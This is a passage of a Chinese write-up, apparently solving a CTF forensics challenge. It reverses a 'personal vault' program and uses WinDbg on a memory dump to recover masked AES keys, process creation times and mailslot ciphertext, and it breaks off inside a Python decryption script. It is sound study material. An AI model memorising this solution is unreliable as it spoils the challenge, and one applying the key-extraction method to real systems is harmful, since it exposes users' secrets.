class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">      BYTE8(xmmword_7FF611D36BB8) ^= LOBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_DWORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BB8 + <span class="number">9</span>) ^= *(_DWORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">      LOBYTE(xmmword_7FF611D36BC8) = LOBYTE(v80[<span class="number">2</span>]) ^ xmmword_7FF611D36BC8;</span><br><span class="line">      *(_DWORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BC8 + <span class="number">1</span>) ^= *(_DWORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">      BYTE8(xmmword_7FF611D36BC8) ^= LOBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      *(_DWORD *)((<span class="type">char</span> *)&amp;xmmword_7FF611D36BC8 + <span class="number">9</span>) ^= *(_DWORD *)((<span class="type">char</span> *)&amp;v80[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">      HIBYTE(xmmword_7FF611D36BC8) ^= HIBYTE(v80[<span class="number">2</span>]);</span><br><span class="line">      v60 = <span class="number">0LL</span>;</span><br><span class="line">      v59 = xmmword_7FF611D36BB8;</span><br><span class="line">      v58 = *(_OWORD *)&amp;pbBuffer;</span><br><span class="line">      *((_QWORD *)&amp;v43 + <span class="number">1</span>) = *((_QWORD *)&amp;xmmword_7FF611D36BC8 + <span class="number">1</span>);</span><br><span class="line">      *(<span class="type">double</span> *)&amp;v43 = sub_7FF611D11000(v81, &amp;v58);</span><br><span class="line">      lpBuffer_4 = lpBuffer_3;                  <span class="comment">// AES解密</span></span><br><span class="line">      v81[<span class="number">15</span>] = v43;</span><br><span class="line">      <span class="keyword">if</span> ( NextSize )</span><br><span class="line">      &#123;</span><br><span class="line">        v45 = (<span class="type">char</span> *)((<span class="type">char</span> *)&amp;v81[<span class="number">15</span>] - lpBuffer_3);</span><br><span class="line">        v46 = (((<span class="type">unsigned</span> __int64)NextSize - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v47 = *lpBuffer_4;</span><br><span class="line">          sub_7FF611D118E0(lpBuffer_4, v81);</span><br><span class="line">          n16_1 = <span class="number">16LL</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)lpBuffer_4 ^= *((_BYTE *)lpBuffer_4 + (_QWORD)v45);</span><br><span class="line">            lpBuffer_4 = (_OWORD *)((<span class="type">char</span> *)lpBuffer_4 + <span class="number">1</span>);</span><br><span class="line">            --n16_1;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( n16_1 );</span><br><span class="line">          v45 -= <span class="number">16</span>;</span><br><span class="line">          v81[<span class="number">15</span>] = v47;</span><br><span class="line">          --v46;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v46 );</span><br><span class="line">        v42 = BYTE1(v80[<span class="number">2</span>]);</span><br><span class="line">        v41 = v80[<span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;pbBuffer + <span class="number">1</span>) ^= HIDWORD(v80[<span class="number">2</span>]);</span><br><span class="line">      *((_DWORD *)&amp;pbBuffer + <span class="number">3</span>) ^= HIDWORD(v80[<span class="number">2</span>]);</span><br><span class="line">      DWORD1(xmmword_7FF611D36BB8) ^= HIDWORD(v80[<span class="number">2</span>]);</span><br><span class="line">      HIDWORD(xmmword_7FF611D36BB8) ^= HIDWORD(v80[<span class="number">2</span>]);</span><br><span class="line">      DWORD1(xmmword_7FF611D36BC8) ^= HIDWORD(v80[<span class="number">2</span>]);</span><br><span class="line">      HIDWORD(xmmword_7FF611D36BC8) ^= HIDWORD(v80[<span class="number">2</span>]);</span><br><span class="line">      pbBuffer ^= v41;</span><br><span class="line">      *(&amp;pbBuffer + <span class="number">1</span>) ^= v42;</span><br><span class="line">      *((_WORD *)&amp;pbBuffer + <span class="number">1</span>) ^= WORD1(v80[<span class="number">2</span>]);</span><br><span class="line">      *(&amp;pbBuffer + <span class="number">8</span>) ^= v41;</span><br><span class="line">      *(&amp;pbBuffer + <span class="number">9</span>) ^= v42;</span><br><span class="line">      *((_WORD *)&amp;pbBuffer + <span class="number">5</span>) ^= WORD1(v80[<span class="number">2</span>]);</span><br><span class="line">      LOBYTE(xmmword_7FF611D36BB8) = v41 ^ xmmword_7FF611D36BB8;</span><br><span class="line">      BYTE1(xmmword_7FF611D36BB8) ^= v42;</span><br><span class="line">      WORD1(xmmword_7FF611D36BB8) ^= WORD1(v80[<span class="number">2</span>]);</span><br><span class="line">      BYTE8(xmmword_7FF611D36BB8) ^= v41;</span><br><span class="line">      BYTE9(xmmword_7FF611D36BB8) ^= v42;</span><br><span class="line">      WORD5(xmmword_7FF611D36BB8) ^= WORD1(v80[<span class="number">2</span>]);</span><br><span class="line">      LOBYTE(xmmword_7FF611D36BC8) = v41 ^ xmmword_7FF611D36BC8;</span><br><span class="line">      BYTE1(xmmword_7FF611D36BC8) ^= v42;</span><br><span class="line">      WORD1(xmmword_7FF611D36BC8) ^= WORD1(v80[<span class="number">2</span>]);</span><br><span class="line">      BYTE8(xmmword_7FF611D36BC8) ^= v41;</span><br><span class="line">      BYTE9(xmmword_7FF611D36BC8) ^= v42;</span><br><span class="line">      WORD5(xmmword_7FF611D36BC8) ^= WORD1(v80[<span class="number">2</span>]);</span><br><span class="line">      <span class="built_in">memset</span>(v80, <span class="number">0</span>, <span class="keyword">sizeof</span>(v80));</span><br><span class="line">      <span class="keyword">if</span> ( NextSize )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (NextSize &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v49 = &amp;lpBuffer_3[NextSize - <span class="number">1</span>];</span><br><span class="line">          v50 = (<span class="type">unsigned</span> __int8)*v49;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v50 - <span class="number">1</span>) &lt;= <span class="number">0xF</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            v51 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !(_BYTE)v50 )</span><br><span class="line">            &#123;</span><br><span class="line">LABEL_55:</span><br><span class="line">              v52 = NextSize - v50;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( *v49 == (_BYTE)v50 )</span><br><span class="line">            &#123;</span><br><span class="line">              ++v51;</span><br><span class="line">              --v49;</span><br><span class="line">              <span class="keyword">if</span> ( v51 &gt;= v50 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v52 = <span class="number">0</span>;</span><br><span class="line">LABEL_57:</span><br><span class="line">      <span class="keyword">if</span> ( v52 )                                <span class="comment">// 显示解密结果</span></span><br><span class="line">      &#123;</span><br><span class="line">        lpBuffer_3[v52] = <span class="number">0</span>;</span><br><span class="line">        MessageBoxA(hWndParent, lpBuffer_3, <span class="string">&quot;Secret&quot;</span>, <span class="number">0x40</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 解密失败</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_7FF611D11AD0(Name, <span class="number">0x50</span>uLL, <span class="string">&quot;\\\\.\\mailslot\\mailslot_%x&quot;</span>);</span><br><span class="line">        hFile = CreateFileA(Name, GENERIC_WRITE, FILE_READ_DATA, <span class="number">0LL</span>, OPEN_EXISTING, FILE_READ_ATTRIBUTES, <span class="number">0LL</span>);</span><br><span class="line">        WriteFile(hFile, lpBuffer_3, NextSize, lpNumberOfBytesWritten, <span class="number">0LL</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="built_in">memset</span>(lpBuffer_3, <span class="number">0</span>, NextSize);</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">char</span> *)v81 + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0xF8</span>uLL);</span><br><span class="line">        *(_QWORD *)&amp;v81[<span class="number">0</span>] = <span class="number">0x130303030</span>LL;</span><br><span class="line">        v69 = v81;</span><br><span class="line">        v68 = <span class="number">0LL</span>;</span><br><span class="line">        NtConvertBetweenAuxiliaryCounterAndPerformanceCounter(<span class="number">1LL</span>, &amp;v69, &amp;v68, <span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> DefWindowProcW(hWndParent, Msg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取当前用户名并计算用户名hash，打开创建邮件槽时映射的内存，拿到邮件槽的句柄，调用ReadFile获取密文</p><p>与内核通信获取当前进程的<code>CreateTime</code>，异或解密刚刚被异或加密的pbBuffer，也就是（Key+IV）共48字节。</p><p>将解密的数据与输入的secret进行比对，正确则输出secret窗口，不正确就打开当前用户名的邮件槽，将解密数据写回邮件槽，设置Signal&#x3D;1,触发了驱动的地址异常，触发了蓝屏</p><p>所以触发蓝屏的原因是：输入用户名解密secret时，解密出的数据与当时输入的明文不匹配。我们从windbg中发现内存中有两个apersonalVault进程，两个进程分别输入了两个不同的用户名创建了两个邮件槽，其中一个进程输入了另一个进程的用户名，得到了另一个进程的密文，这个密文不是用它的密钥加密的，所以肯定无法正确解密，比对失败后Signal&#x3D;1,触发蓝屏</p><p>如何解密：获取两个进程中被加密的48字节数据(key+IV),再获取两个进程的CreateTime,异或解密出真正的key和IV</p><p>获取两个进程的邮件槽中存储的密文</p><p>进程1的密文直接用进程1的key和IV进行AES-CBC解密出明文</p><p>进程2的密文由于被进程1误解密过一次并覆盖到邮件槽，所以先用进程1的key和IV加密一次，再用进程2的Key和IV解密出明文</p><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028132711060.png" alt="image-20251028132711060"></p><p>找到了pbBuffer在程序中的地址</p><p>windbg中找到两个进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PROCESS ffffef063fbe8080</span><br><span class="line">    SessionId: none  Cid: 0fa8    Peb: 9f83185000  ParentCid: 14b0</span><br><span class="line">    DirBase: 840fe000  ObjectTable: ffffa687a7241740  HandleCount: 161.</span><br><span class="line">    Image: aPersonalVault.exe</span><br><span class="line"></span><br><span class="line">PROCESS ffffef063fbc1080</span><br><span class="line">    SessionId: none  Cid: 26f0    Peb: 9216e1a000  ParentCid: 14b0</span><br><span class="line">    DirBase: 1296dc000  ObjectTable: ffffa687a6dd3b40  HandleCount: 165.</span><br><span class="line">    Image: aPersonalVault.exe</span><br></pre></td></tr></table></figure><p>先使用<code>.process /r /p Eprocess地址</code>，切换到对应进程，然后通过偏移读取数据</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028133350490.png" alt="image-20251028133350490"></p><p><code>lm vm aPersonalVault</code>查看进程模块信息，可以看到aPersonalVault的两个进程基址是0x00007ff611d10000</p><p>查看了进程1的密钥，切换进程后查看进程2的密钥</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028134025384.png" alt="image-20251028134025384"></p><p>CreateTime获取：<code>dt nt!_EPROCESS ffffef063fbe8080</code></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028134502257.png" alt="image-20251028134502257"></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028134704545.png" alt="image-20251028134704545"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进程1：0x01dc3fe6ed454439</span><br><span class="line">进程2：0x01dc3fe6f02a77eb</span><br></pre></td></tr></table></figure><p>密文获取</p><p>查看邮件槽句柄的地址</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028140353307.png" alt="image-20251028140353307"></p><p>切换进程，读取进程1和进程2中邮件槽句柄</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028141459562.png" alt="image-20251028141459562"></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028141408189.png" alt="image-20251028141408189"></p><p>两个句柄分别是0x27C和0x280</p><p>获取该进程0x27c句柄的信息</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028141709390.png" alt="image-20251028141709390"></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028162827492.png" alt="image-20251028162827492"></p><p>\mailslot_e60a23e2是邮件槽的唯一标识名，Object地址是ffffe70b7f057380，按文件对象的结构进行解析</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028142706844.png" alt="image-20251028142706844"></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028162930357.png" alt="image-20251028162930357"></p><p>DeviceObject说明这个文件对象 <code>ffffe70b7f057380</code> 关联到设备对象 <code>ffffef063d2d9770</code>，所有对该文件对象的 I&#x2F;O 操作最终都会路由到这个设备对象处理</p><p>点击DeviceObject,发现它是Msfs驱动</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028145500937.png" alt="image-20251028145500937"></p><h3 id="Msfs分析"><a href="#Msfs分析" class="headerlink" title="Msfs分析"></a>Msfs分析</h3><p>分析本机的msfs.sys</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028160411866.png" alt="image-20251028160411866"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IRP_MJ_CREATE_NAMED_PIPE (2) - 创建命名管道请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)&amp;DispatchCreateNamedPipe;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_READ (3) - 读请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">3</span>] = (PDRIVER_DISPATCH)DispatchRead;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_WRITE (4) - 写请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">4</span>] = (PDRIVER_DISPATCH)&amp;DispatchWrite;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_QUERY_INFORMATION (5) - 查询信息请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">5</span>] = (PDRIVER_DISPATCH)&amp;DispatchQueryInformation;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_SET_INFORMATION (6) - 设置信息请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">6</span>] = (PDRIVER_DISPATCH)&amp;DispatchSetInformation;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_QUERY_VOLUME_INFORMATION (10) - 查询卷信息请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">10</span>] = (PDRIVER_DISPATCH)DispatchQueryVolumeInformation;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_DIRECTORY_CONTROL (18) - 目录控制请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">18</span>] = (PDRIVER_DISPATCH)&amp;DispatchDirectoryControl;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// IRP_MJ_DEVICE_CONTROL (12) - 设备控制请求处理</span></span><br><span class="line">  DriverObject-&gt;MajorFunction[<span class="number">12</span>] = (PDRIVER_DISPATCH)DispatchDeviceControl;</span><br></pre></td></tr></table></figure><p>转到读处理函数分析</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028161022717.png" alt="image-20251028161022717"></p><p>FsContext + 0x118处存储了数据，进入sub_1C000A0A0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">PerformSyncRead</span><span class="params">(</span></span><br><span class="line"><span class="params">        _QWORD *IoStatusBlock,</span></span><br><span class="line"><span class="params">        ULONG_PTR FileControlBlock,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> ReadFlags,</span></span><br><span class="line"><span class="params">        __int64 UserBuffer,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> RequestedLength,</span></span><br><span class="line"><span class="params">        _DWORD *BytesNeeded)</span></span><br><span class="line">&#123;</span><br><span class="line">  ULONG_PTR DataBlock; <span class="comment">// r14</span></span><br><span class="line">  __int64 DataBuffer; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> DataSize; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> BytesToCopy; <span class="comment">// eax</span></span><br><span class="line">  __int64 CopiedBytes; <span class="comment">// rdi</span></span><br><span class="line">  ULONG_PTR ErrorParameter; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化IO状态块</span></span><br><span class="line">  *IoStatusBlock = <span class="number">0LL</span>;</span><br><span class="line">  IoStatusBlock[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取数据块指针（文件控制块+24处的指针减去8）</span></span><br><span class="line">  DataBlock = *(_QWORD *)(FileControlBlock + <span class="number">24</span>) - <span class="number">8LL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取数据缓冲区和数据大小</span></span><br><span class="line">  DataBuffer = *(_QWORD *)(DataBlock + <span class="number">40</span>);</span><br><span class="line">  DataSize = *(_DWORD *)(DataBlock + <span class="number">32</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 检查请求长度是否足够</span></span><br><span class="line">  <span class="keyword">if</span> ( RequestedLength &lt; DataSize )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ReadFlags != <span class="number">4</span> )  <span class="comment">// 如果不是部分读取模式</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 返回缓冲区太小的错误</span></span><br><span class="line">      *(_DWORD *)IoStatusBlock = STATUS_BUFFER_TOO_SMALL;  <span class="comment">// 0xC0000023</span></span><br><span class="line">      <span class="keyword">return</span> IoStatusBlock;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 部分读取模式，设置状态为缓冲区溢出</span></span><br><span class="line">    *(_DWORD *)IoStatusBlock = STATUS_BUFFER_OVERFLOW;  <span class="comment">// 0x80000005</span></span><br><span class="line">    BytesToCopy = RequestedLength;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 请求长度足够，复制全部数据</span></span><br><span class="line">    BytesToCopy = *(_DWORD *)(DataBlock + <span class="number">32</span>);  <span class="comment">// DataSize</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 实际字节数</span></span><br><span class="line">  CopiedBytes = BytesToCopy;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 执行内存复制：从数据缓冲区复制到用户缓冲区</span></span><br><span class="line">  MemoryCopy(UserBuffer, DataBuffer, BytesToCopy);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置需要的字节数（原始数据大小）</span></span><br><span class="line">  *BytesNeeded = *(_DWORD *)(DataBlock + <span class="number">32</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果是完整读取且缓冲区足够大</span></span><br><span class="line">  <span class="keyword">if</span> ( DataSize &lt;= RequestedLength )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ReadFlags != <span class="number">4</span> )  <span class="comment">// 如果不是部分读取模式</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 验证数据块的完整性</span></span><br><span class="line">      ErrorParameter = ValidateDataBlock(FileControlBlock, DataBlock);</span><br><span class="line">      <span class="keyword">if</span> ( ErrorParameter )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果验证失败，触发系统崩溃（BugCheck）</span></span><br><span class="line">        KeBugCheckEx(</span><br><span class="line">          <span class="number">0x52</span>u,           <span class="comment">// FAT_FILE_SYSTEM</span></span><br><span class="line">          <span class="number">1uLL</span>,            <span class="comment">// 错误代码</span></span><br><span class="line">          ErrorParameter,   <span class="comment">// 错误参数1</span></span><br><span class="line">          FileControlBlock, <span class="comment">// 错误参数2  </span></span><br><span class="line">          DataBlock        <span class="comment">// 错误参数3</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置成功状态</span></span><br><span class="line">    *(_DWORD *)IoStatusBlock = STATUS_SUCCESS;  <span class="comment">// 0</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置实际复制的字节数</span></span><br><span class="line">  IoStatusBlock[<span class="number">1</span>] = CopiedBytes;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> IoStatusBlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Context+0x18处是其数据的<code>LIST_ENTRY</code>，<code>- 8</code>则是原始数据结构的头部，<code>+ 0x28</code>则是数据指针，<code>+ 0x20</code>则是数据长度</p><p>list_entry</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028161747407.png" alt="image-20251028161747407"></p><p>data length</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028161929790.png" alt="image-20251028161929790"></p><p>data ptr</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028162030011.png" alt="image-20251028162030011"></p><p>密文为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">密文_1080：</span><br><span class="line">95 c2 4e 06 41 92 cf 1c-52 18 01 32 86 4e 38 5e  </span><br><span class="line">e2 ee 24 7b 68 0f dc be-7e 14 3b ee 47 fd 22 13  </span><br><span class="line">b3 71 1c 1b 40 08 e2 b3-ff 78 34 eb e5 3e 7d 53  </span><br><span class="line">48 53 59 16 74 46 f5 8b-eb 9d 96 1c 57 13 5e bb  </span><br><span class="line">2a 18 fa 30 98 29 23 db-99 73 d6 ac 4b 01 88 c5  </span><br><span class="line">7e 38 b0 a5 8d 3e 71 b0-fe c9 8e 7b d8 e3 0c 2c  </span><br><span class="line">27 07 b9 94 94 68 53 af-71 98 84 3b 89 ac 21 de  </span><br><span class="line">56 67 7c c3 e6 cf 43 b8-d6 d5 39 61 5c 76 31 79 </span><br><span class="line">密文_8080:</span><br><span class="line">3c 5b 7d 22 a8 62 ff 7e-89 ef f9 6d 26 e3 d3 e6 </span><br><span class="line">2f c3 9d ff 8a c5 4c 0b-e2 d1 02 47 39 45 96 83  </span><br><span class="line">46 ce 20 68 f6 0a f0 65-2b 5b 85 be 4f dc f5 63  </span><br><span class="line">ee e2 74 9f 4e 07 71 29-03 94 7e 5a b0 bf 66 75  </span><br><span class="line">6c 4b 9c d7 c2 10 fd 45-4d a9 65 36 84 02 f9 8e</span><br></pre></td></tr></table></figure><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028162155076.png" alt="image-20251028162155076"></p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028163207874.png" alt="image-20251028163207874"></p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>需要的数据已经得到，开始解密</p><p>首先把48字节和对应的CreateTime异或得到真正的key和IV</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    EncKeyIV_8080 = [<span class="number">0x45</span>, <span class="number">0x71</span>, <span class="number">0x9c</span>, <span class="number">0x96</span>, <span class="number">0xf3</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x2e</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0xf2</span>, <span class="number">0x94</span>, <span class="number">0x64</span>, <span class="number">0x4e</span>, <span class="number">0xc7</span>, <span class="number">0xe5</span>,</span><br><span class="line">                     <span class="number">0x52</span>, <span class="number">0xa4</span>, <span class="number">0x46</span>, <span class="number">0x35</span>, <span 